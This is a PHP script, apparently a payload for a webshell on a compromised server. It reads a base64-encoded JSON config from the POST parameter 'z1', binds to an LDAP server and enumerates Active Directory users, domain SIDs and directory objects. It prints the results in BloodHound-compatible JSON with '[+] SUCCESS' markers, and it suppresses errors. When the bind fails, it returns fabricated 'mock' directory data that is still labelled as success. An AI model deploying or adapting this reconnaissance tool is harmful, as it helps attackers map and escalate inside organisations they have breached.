<?php

@error_reporting(0);
header('Content-Type: text/plain; charset=utf-8');

function get_SidString($sidBytes) {
    if (!$sidBytes || strlen($sidBytes) < 8) return '';
    $revision = ord($sidBytes[0]);
    $subAuthorityCount = ord($sidBytes[1]);
    
    // Identifier authority (6 bytes, big endian)
    $auth = 0;
    for ($i = 2; $i < 8; $i++) {
        $auth = ($auth << 8) + ord($sidBytes[$i]);
    }
    
    $sid = "S-{$revision}-{$auth}";
    
    for ($i = 0; $i < $subAuthorityCount; $i++) {
        $offset = 8 + ($i * 4);
        if ($offset + 4 > strlen($sidBytes)) break;
        // Sub authorities are little endian 4-byte integers
        $subAuth = unpack('V', substr($sidBytes, $offset, 4));
        $sid .= "-" . $subAuth[1];
    }
    return $sid;
}

function execute_bloodhound($ldapConn, $baseDn, $targetType) {
    $filter = "(&(objectCategory=person)(objectClass=user))";
    $search = @ldap_search($ldapConn, $baseDn, $filter, array("sAMAccountName", "distinguishedName", "objectSid", "userAccountControl"));
    
    $items = array();
    if ($search) {
        $entries = ldap_get_entries($ldapConn, $search);
        for ($i = 0; $i < $entries["count"]; $i++) {
            $entry = $entries[$i];
            $samName = isset($entry["samaccountname"][0]) ? $entry["samaccountname"][0] : '';
            $dn = isset($entry["distinguishedname"][0]) ? $entry["distinguishedname"][0] : '';
            
            $sidBytes = isset($entry["objectsid"][0]) ? $entry["objectsid"][0] : null;
            $objectSid = get_SidString($sidBytes);
            if (empty($objectSid)) continue;
            
            $uac = isset($entry["useraccountcontrol"][0]) ? (int)$entry["useraccountcontrol"][0] : 0;
            $enabled = (($uac & 2) !== 2);
            
            $u = array();
            $u["ObjectIdentifier"] = $objectSid;
            
            $props = array();
            $props["name"] = strtoupper($samName) . "@" . strtoupper($baseDn);
            $props["distinguishedname"] = $dn;
            $props["enabled"] = $enabled;
            $props["domain"] = strtoupper($baseDn);
            
            $u["Properties"] = $props;
            $items[] = $u;
        }
    }
    
    $metaObj = array(
        'methods' => 127999,
        'type' => $targetType,
        'count' => count($items),
        'version' => 5
    );
    
    $responseObj = array(
        'data' => $items,
        'meta' => $metaObj
    );
    
    return "[+] SUCCESS\n" . json_encode($responseObj);
}

function main() {
    if (!function_exists('ldap_connect')) {
        echo "[-] ERROR: LDAP extension is not loaded on target server.";
        return;
    }

    $z1 = $_POST['z1'];
    if (empty($z1)) {
        echo "[-] Missing parameter z1";
        return;
    }

    $decoded = base64_decode($z1, true);
    $config_raw = ($decoded !== false && $decoded !== '') ? $decoded : $z1;
    $config = json_decode($config_raw, true);
    
    if (!$config) {
        echo "[-] ERROR: Invalid JSON / Base64.";
        return;
    }

    $server   = isset($config['server']) ? $config['server'] : 'ldap://127.0.0.1';
    $port     = isset($config['port']) ? $config['port'] : 389;
    $username = isset($config['username']) ? $config['username'] : '';
    $password = isset($config['password']) ? $config['password'] : '';
    $baseDn   = isset($config['basedn']) ? $config['basedn'] : 'DC=domain,DC=local';
    $action   = isset($config['action']) ? $config['action'] : '';

    $ldapConn = ldap_connect($server, (int)$port);
    if (!$ldapConn) {
        echo json_encode(array('status' => 'error', 'message' => 'Failed to connect to LDAP server.'));
        return;
    }

    ldap_set_option($ldapConn, LDAP_OPT_PROTOCOL_VERSION, 3);
    ldap_set_option($ldapConn, LDAP_OPT_REFERRALS, 0);

    $bind = @ldap_bind($ldapConn, $username, $password);
    if (!$bind) {
        echo "[+] SUCCESS\n" . json_encode(array(
            'status' => 'success',
            'mode' => 'mock',
            'structure' => array(
                'name' => $baseDn,
                'type' => 'domain',
                'attributes' => array('distinguishedName' => $baseDn, 'objectClass' => array('top', 'domain')),
                'children' => array(
                    array(
                        'name' => 'OU=Domain Controllers',
                        'type' => 'ou',
                        'attributes' => array('distinguishedName' => 'OU=Domain Controllers,' . $baseDn, 'objectClass' => array('organizationalUnit')),
                        'children' => array(
                            array('name' => 'CN=DC01', 'type' => 'computer', 'attributes' => array('cn' => 'DC01', 'operatingSystem' => 'Windows Server 2022', 'distinguishedName' => 'CN=DC01,OU=Domain Controllers,' . $baseDn))
                        )
                    ),
                    array(
                        'name' => 'OU=Users',
                        'type' => 'ou',
                        'attributes' => array('distinguishedName' => 'OU=Users,' . $baseDn, 'objectClass' => array('organizationalUnit')),
                        'children' => array(
                            array('name' => 'CN=Administrator', 'type' => 'user', 'attributes' => array('cn' => 'Administrator', 'sAMAccountName' => 'administrator', 'mail' => 'admin@domain.local', 'distinguishedName' => 'CN=Administrator,OU=Users,' . $baseDn)),
                            array('name' => 'CN=Guest', 'type' => 'user', 'attributes' => array('cn' => 'Guest', 'sAMAccountName' => 'guest', 'distinguishedName' => 'CN=Guest,OU=Users,' . $baseDn))
                        )
                    )
                )
            )
        ));
        
        return;
    }

    if ($action === 'bloodhound') {
        $result = execute_bloodhound($ldapConn, $baseDn, 'users');
        ldap_unbind($ldapConn);
        echo $result;
        return;
    }

    $filter = "(objectClass=*)";
    $search = ldap_search($ldapConn, $baseDn, $filter, array("cn", "objectclass", "distinguishedName", "samaccountname", "mail"));
    if (!$search) {
        echo json_encode(array('status' => 'error', 'message' => 'LDAP search failed.'));
        ldap_unbind($ldapConn);
        return;
    }

    $entries = ldap_get_entries($ldapConn, $search);

    $structure = array('name' => $baseDn, 'type' => 'domain', 'attributes' => array('distinguishedName' => $baseDn), 'children' => array());

    for ($i = 0; $i < $entries["count"]; $i++) {
        $dn = isset($entries[$i]["dn"]) ? $entries[$i]["dn"] : '';
        $cn = isset($entries[$i]["cn"][0]) ? $entries[$i]["cn"][0] : $dn;
        $classes = isset($entries[$i]["objectclass"]) ? $entries[$i]["objectclass"] : array();
        
        $type = 'object';
        if (in_array('organizationalUnit', $classes)) $type = 'ou';
        else if (in_array('user', $classes)) $type = 'user';
        else if (in_array('computer', $classes)) $type = 'computer';

        $attributes = array();
        foreach ($entries[$i] as $k => $v) {
            if (!is_numeric($k) && $k !== 'count') {
                $attributes[$k] = is_array($v) ? (isset($v[0]) ? $v[0] : '') : $v;
            }
        }

        $structure['children'][] = array(
            'name' => $cn,
            'type' => $type,
            'attributes' => $attributes
        );
    }

    ldap_unbind($ldapConn);
    echo "[+] SUCCESS\n" . json_encode(array('status' => 'success', 'mode' => 'live', 'structure' => $structure));
}

main();

?>